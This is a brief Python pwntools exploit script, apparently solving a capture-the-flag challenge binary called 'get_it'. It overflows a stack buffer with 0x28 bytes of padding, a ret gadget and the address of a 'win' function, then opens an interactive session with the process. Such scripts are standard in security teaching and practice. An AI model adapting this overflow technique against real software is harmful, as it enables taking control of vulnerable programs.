#!/usr/bin/env python3

from pwn import *

context.binary = binary = ELF("./get_it")

p = process("./get_it")

# gdb.attach(p)

padding = b'a'*0x28

win = 0x00000000004005b6
ret_gadget = 0x0000000000400451

payload = padding + p64(ret_gadget) + p64(win)

p.recvline()
p.sendline(payload)

p.interactive()
